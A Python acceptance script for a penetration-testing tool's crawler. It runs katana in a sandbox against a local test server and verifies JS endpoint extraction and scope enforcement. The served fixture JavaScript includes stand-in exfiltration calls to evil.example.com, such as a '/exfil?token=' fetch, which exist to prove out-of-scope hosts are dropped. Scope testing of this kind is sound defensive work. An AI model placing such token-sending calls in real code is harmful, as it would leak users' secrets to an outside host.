#!/usr/bin/env python3
"""M16-a 验收：katana 从 JS 里翻接口（只做发现侧）。

跑**真实沙箱**里的 katana（构造器 argv 就是生产 argv），对一个本地靶（页面
引用 JS，JS 里写死接口路径 + 外域绝对 URL）做实测，验证：

1. 构造器 argv 含恒在的 ``-jc``（``-jsl`` 可选、缺省关）；
2. **JS 里写死的接口路径能被提取并落成 Signal**——贴 stdout 原始行 + 解析
   结果片段（证据落盘，可事后复核）；
3. 提取到的 Signal 走既有 ``param-endpoint`` 通道进 triage（零新增解析器）；
4. **scope 兜底**：JS 里含外域绝对 URL 时，外域不产生候选——靶侧访问日志
   逐条核对没有外域请求，且越界记录即使塞进 triage 也被 ``check_scope``
   丢成 ``triage_out_of_scope``。

如实的接缝说明
--------------
- 沙箱出口用 ``egress.mode="open"``：``restricted`` 走 internal 网络 + 白名单
  代理，容器**够不到宿主**；本 demo 的靶在宿主上，故必须放开出口。这条与
  scope 防线无关——**scope 的两层（``check_scope`` 与容器侧）本轮逻辑零改动**，
  本 demo 验的是"外域不进候选"，不是"出口代理挡外域"。
- katana 的 JS 爬取在 ``-c 5`` 下每次只吐 1 条左右接口（靶侧/宿主侧两侧都
  实测过），故本 demo 对靶跑多次并把结果并起来看；这点**如实计入报告**，
  属 katana 1.7.0 行为，不是本轮引入的。

用法：
    .venv/bin/python scripts/demo_katana_js.py            # 缺省 3 轮
    .venv/bin/python scripts/demo_katana_js.py --rounds 5

产物落 ``evidence/demo_katana_js/<时间戳>/``（gitignored）。
"""
from __future__ import annotations

import argparse
import json
import socket
import sys
import threading
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from proofhound.compliance.audit import AuditLog  # noqa: E402
from proofhound.compliance.scope import Scope, check_scope  # noqa: E402
from proofhound.core.orchestrator import Orchestrator  # noqa: E402
from proofhound.findings.finding import FindingStore  # noqa: E402
from proofhound.skills.registry import SkillRegistry  # noqa: E402
from proofhound.tools.build import build_command  # noqa: E402
from proofhound.tools.egress import EgressPolicy  # noqa: E402
from proofhound.tools.parsers import parse_katana_jsonl  # noqa: E402
from proofhound.tools.sandbox import SandboxConfig, SandboxRunner  # noqa: E402

#: 外域（绝不会真去访问：`.example` 是保留域；本轮要证的是它连候选都不产生）
EXTERNAL_HOST = "evil.example.com"

#: 靶面 JS：写死的接口路径（真实前端形态）+ 外域绝对 URL
APP_JS = """
const API = {
  user:    "/api/user?id=1",
  search:  "/api/search?q=hello&page=2",
  admin:   "/api/admin/users?role=admin",
  detail:  "/api/item/detail",
};
fetch("/api/orders?order_id=42&user=1");
fetch("/api/export?file=report.csv");
fetch("/api/download?file=report.pdf&user=1");
fetch("/api/report?report_id=5&format=csv");
fetch("/api/profile?uid=3&fields=all");
fetch("/api/audit/log?from=2026-01-01&actor=1");
fetch("/api/billing/invoice?invoice_id=88&format=pdf");
fetch("/api/v2/thing?thing_id=7&verbose=1");
fetch("/api/login?user=1");
fetch("/api/page?page=2&sort=desc");
// ---- 外域绝对 URL：这三个域**必须**一个候选都不产生 ----
fetch("http://evil.example.com/exfil?token=abc&user=1");
fetch("https://evil.example.com/api/steal?id=7");
const CDN = "http://cdn.evil-other.example.org/asset?v=2";
$.ajax({ url: "http://evil.example.com/api/jquery?id=3", method: "GET" });
""".strip()

PAGE = """<html><body><h1>spa</h1>
<script src="/static/app.js"></script>
<a href="/about">about</a>
</body></html>"""


class _RecordingTarget(BaseHTTPRequestHandler):
    """靶：记录**每一条**到达请求的 Host，用于核对外域是否被真请求。"""

    def do_GET(self):  # noqa: N802
        host = self.headers.get("Host") or ""
        with self.server.access_log_path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps({"host": host, "path": self.path}) + "\n")
        path = self.path.split("?")[0]
        if path == "/":
            self._send(200, "text/html; charset=utf-8", PAGE)
        elif path == "/static/app.js":
            self._send(200, "application/javascript; charset=utf-8", APP_JS)
        elif path == "/about":
            self._send(200, "text/html; charset=utf-8", "<html><body>about</body></html>")
        else:
            self._send(200, "text/html; charset=utf-8", f"<html><body>page {path}</body></html>")

    def _send(self, code, ctype, body):
        raw = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def log_message(self, *a):
        pass


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def _start_target(access_log: Path, port: int) -> ThreadingHTTPServer:
    server = ThreadingHTTPServer(("127.0.0.1", port), _RecordingTarget)
    server.access_log_path = access_log  # type: ignore[attr-defined]
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def _endpoints_from_stdout(text: str) -> list[str]:
    """从 katana JSONL 里取 endpoint（保序去重）。"""
    seen, out = set(), []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            continue
        if not isinstance(data, dict):
            continue
        endpoint = (data.get("request") or {}).get("endpoint")
        if isinstance(endpoint, str) and endpoint and endpoint not in seen:
            seen.add(endpoint)
            out.append(endpoint)
    return out


def main() -> int:
    parser = argparse.ArgumentParser(description="ProofHound M16-a 验收：katana JS 端点发现")
    parser.add_argument("--rounds", type=int, default=3,
                        help="对靶重复跑几轮 katana（JS 提取每轮只吐少量接口）")
    args = parser.parse_args()

    try:
        import docker

        client = docker.from_env()
        client.ping()
    except Exception as exc:  # noqa: BLE001
        print(f"[环境错误] Docker 不可用（沙箱是红线，无法跳过）: {exc}", file=sys.stderr)
        return 2

    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    run_dir = REPO / "evidence" / "demo_katana_js" / stamp
    run_dir.mkdir(parents=True, exist_ok=True)
    print(f"[*] 运行目录: {run_dir}")

    # ---- 步骤 1：构造器 argv（生产 argv 就是下面这条）----
    print("\n===== 1) 构造器 argv（-jc 恒在；-jsl 可选缺省关）=====")
    base_argv = build_command("katana", {"target": "http://SEED/"})
    argv_jsl = build_command("katana", {"target": "http://SEED/", "jsluice": True})
    print(f"  缺省  : {base_argv}")
    print(f"  jsluice: {argv_jsl}")
    assert "-jc" in base_argv, "-jc 必须是恒在项"
    assert "-jsl" not in base_argv, "-jsl 缺省必须关"
    assert "-jsl" in argv_jsl, "-jsl 须可显式开"
    assert "-kf" not in base_argv and "-kf" not in argv_jsl, "本轮不暴露 -kf"
    print("  ✅ -jc 恒在 / -jsl 可选缺省关 / 无 -kf")

    # ---- 步骤 2：真实沙箱跑 katana ----
    port = _free_port()
    access_log = run_dir / "target_access.jsonl"
    access_log.write_text("", encoding="utf-8")
    server = _start_target(access_log, port)
    target = f"http://127.0.0.1:{port}/"
    print(f"\n===== 2) 真实沙箱跑 katana（靶 {target}）=====")

    audit = AuditLog(run_dir / "audit.jsonl")
    scope = Scope(networks=["127.0.0.0/8"], ports=[port])
    config = SandboxConfig(
        egress=EgressPolicy(mode="open"),  # 见模块 docstring 的接缝说明
        network_mode="host",
    )
    sandbox = SandboxRunner(
        scope, audit, run_dir, REPO / "tools.d", config=config, client=client
    )

    all_stdout = []
    extract_times: list[float] = []
    try:
        for i in range(1, args.rounds + 1):
            argv = build_command("katana", {"target": target, "depth": 2, "concurrency": 5}, session=None)
            result = sandbox.run("katana", argv[1:], timeout=300)
            assert not result.rejected, f"命令被沙箱拒绝：{result.violations}"
            text = result.stdout_path.read_text(encoding="utf-8", errors="replace")
            all_stdout.append(text)
            eps = _endpoints_from_stdout(text)
            api = [e for e in eps if "/api/" in e]
            print(f"  · 第 {i} 轮 exit={result.exit_code} "
                  f"stdout={result.stdout_path.name} 行数={len(text.splitlines())} "
                  f"JS 接口提取={len(api)}")
            for e in api:
                print(f"      {e}")
    finally:
        server.shutdown()

    combined = "\n".join(all_stdout)
    (run_dir / "katana_stdout.jsonl").write_text(combined, encoding="utf-8")

    # ---- 步骤 3：解析成 Signal ----
    print("\n===== 3) 解析成 Signal（零新增解析器）=====")
    signals, skipped = parse_katana_jsonl(
        combined, evidence_path=str(run_dir / "katana_stdout.jsonl"), skill="recon-crawl"
    )
    by_kind: dict[str, int] = {}
    for s in signals:
        by_kind[s.kind] = by_kind.get(s.kind, 0) + 1
    print(f"  Signal 总数={len(signals)} 坏行={skipped} 按 kind={by_kind}")
    js_hits = [s for s in signals if "/api/" in s.asset]
    print(f"  **JS 里翻出来的接口 Signal = {len(js_hits)} 条**；片段：")
    for s in js_hits:
        print(f"      kind={s.kind} asset={s.asset} ref={s.evidence_ref}")
    (run_dir / "signals.jsonl").write_text(
        "\n".join(s.model_dump_json() for s in signals) + ("\n" if signals else ""),
        encoding="utf-8",
    )
    assert js_hits, (
        "未从 JS 提取到任何接口 Signal —— 验收 2 失败。"
        "（katana 的 JS 爬取每轮只吐少量接口，若每轮都为 0 需复核靶/旗标）"
    )

    # ---- 步骤 4：进 triage 通道 ----
    print("\n===== 4) 进既有 param-endpoint 通道（triage）=====")
    (run_dir / "katana_stdout.signals.jsonl").write_text(
        "\n".join(s.model_dump_json() for s in signals) + ("\n" if signals else ""),
        encoding="utf-8",
    )
    orch = Orchestrator(
        SkillRegistry(REPO / "skills").discover(),
        runner=type("R", (), {"scope": scope})(),
        llm=None,
        audit=audit,
        evidence_dir=run_dir,
    )
    orch.run_triage_phase()
    findings = FindingStore(run_dir / "findings.jsonl").load_all()
    print(f"  候选（Finding）={len(findings)} 条；按类型："
          f"{ {t: sum(1 for f in findings if f.vuln_type == t) for t in {f.vuln_type for f in findings}} }")
    for f in findings[:12]:
        print(f"      {f.vuln_type:<13} {f.param or '-':<12} {f.asset}")
    if len(findings) > 12:
        print(f"      …… 其余 {len(findings) - 12} 条见 findings.jsonl")

    # ---- 步骤 5：scope 兜底 ----
    print("\n===== 5) scope 兜底实战 =====")
    note = [
        "本节核对「JS 里含外域绝对 URL 时外域不产生候选」。",
        f"外域 = {EXTERNAL_HOST} / cdn.evil-other.example.org（.example 保留域，不会真出网）。",
        "",
        "层①（-fs rdn 恒在）：katana 把跨域 URL 收敛回种子根域的**路径空间**，",
        "外域主机名根本不进 stdout —— 逐行核对 katana_stdout.jsonl。",
        "层②（check_scope）：万一越界记录仍进了解析器/信号，triage 前逐条过",
        "check_scope，越界丢弃并记 triage_out_of_scope。",
    ]
    for line in note:
        print(f"  {line}")

    # 层①-a：判据落在**决定候选的字段**（request.endpoint）与**请求行**
    # （request.raw）上——不能用"整行含外域主机名"，因为 katana 会把 JS
    # 原文回显在 response.body 里（那是证据，不是候选来源）。
    records = []
    for line in combined.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(rec, dict):
            records.append(rec)
    ext_tokens = (EXTERNAL_HOST, "evil-other")

    def _is_ext(value) -> bool:
        return isinstance(value, str) and any(tok in value for tok in ext_tokens)

    ext_endpoints = [
        (rec.get("request") or {}).get("endpoint")
        for rec in records
        if _is_ext((rec.get("request") or {}).get("endpoint"))
    ]
    ext_raw = [
        (rec.get("request") or {}).get("raw")
        for rec in records
        if _is_ext((rec.get("request") or {}).get("raw"))
    ]
    # 如实记录：外域主机名确实出现在 response.body（JS 原文回显）里
    ext_body = [
        (rec.get("request") or {}).get("endpoint")
        for rec in records
        if _is_ext((rec.get("response") or {}).get("body"))
    ]
    print(f"\n  [层①-a] katana 记录 {len(records)} 条")
    print(f"          request.endpoint 含外域 = {len(ext_endpoints)}  ← 决定候选的字段")
    print(f"          request.raw 含外域      = {len(ext_raw)}  ← 实际发出的请求行")
    print(f"          response.body 含外域    = {len(ext_body)}  ← JS 原文回显（证据，非候选来源）")
    for endpoint in ext_body[:3]:
        print(f"              回显于记录 endpoint={endpoint}")
    assert not ext_endpoints, "endpoint 字段出现外域——候选侧越界，须复核 -fs rdn"
    assert not ext_raw, "raw 请求行出现外域——真的向外域发请求了，须复核 -fs rdn"
    print("          ✅ 外域只出现在被回显的 JS 原文里，未成为任何 endpoint/请求")

    # 层①-b：靶侧访问日志里有没有外域 Host
    access = [json.loads(ln) for ln in access_log.read_text(encoding="utf-8").splitlines() if ln.strip()]
    ext_access = [rec for rec in access if EXTERNAL_HOST in (rec.get("host") or "")
                  or "evil-other" in (rec.get("host") or "")]
    hosts = sorted({rec.get("host") for rec in access if rec.get("host")})
    print(f"  [层①-b] 靶侧共收到 {len(access)} 条请求，Host 取值={hosts}")
    print(f"          其中来自外域 Host 的 = {len(ext_access)}")
    assert not ext_access, "靶收到了外域 Host 请求——外域真的被爬了，须复核"

    # 层②：把"外域接口记录"直接塞进解析器 + triage，看是否被 check_scope 丢掉
    injected = "\n".join(
        json.dumps({
            "timestamp": "2026-09-29T00:00:00Z",
            "request": {"method": "GET", "endpoint": url},
            "response": {"status_code": 200},
        })
        for url in (
            f"http://{EXTERNAL_HOST}/evil/api/users?id=1",
            f"http://{EXTERNAL_HOST}/evil/api/dump?file=users.csv",
        )
    )
    inj_signals, _ = parse_katana_jsonl(
        injected, evidence_path=str(run_dir / "injected_external.jsonl"), skill="recon-crawl"
    )
    print(f"\n  [层②] 注入 2 条外域记录 → 解析出 {len(inj_signals)} 条 Signal（解析器不越权改写）")
    assert len(inj_signals) == 2
    for s in inj_signals:
        decision = check_scope(scope, [s.asset])
        print(f"      check_scope({s.asset}) allowed={decision.allowed} {decision.violations}")
        assert decision.allowed is False, "外域必须被 check_scope 拒"
    # 真跑一遍 triage：外域不得进候选
    (run_dir / "inject.signals.jsonl").write_text(
        "\n".join(s.model_dump_json() for s in inj_signals) + "\n", encoding="utf-8"
    )
    before = FindingStore(run_dir / "findings.jsonl").load_all()
    orch.run_triage_phase()
    after = FindingStore(run_dir / "findings.jsonl").load_all()
    new_assets = {f.asset for f in after if f.id not in {x.id for x in before}}
    print(f"      再跑一轮 triage：新增候选={len(new_assets)} 条 "
          f"（外域候选数={sum(1 for a in new_assets if EXTERNAL_HOST in a)}）")
    oos = [e for e in audit.read_all() if e["event"] == "triage_out_of_scope"]
    print(f"      triage_out_of_scope 审计事件={len(oos)} 条")
    for e in oos:
        print(f"      · {e['asset']} ← {e['violations']}")
    assert not any(EXTERNAL_HOST in a for a in new_assets), "外域产生了候选！"
    assert oos, "外域记录应留下 triage_out_of_scope 审计"
    print("  ✅ 外域不产生候选（层① stdout/访问日志 + 层② check_scope 双双成立）")

    print("\n" + "=" * 72)
    print("✅ M16-a 验收全绿：JS 接口能被提取并落成 Signal；外域被两层兜底挡住")
    print(f"[*] 产物：{run_dir}")
    print("=" * 72)
    return 0


if __name__ == "__main__":
    sys.exit(main())
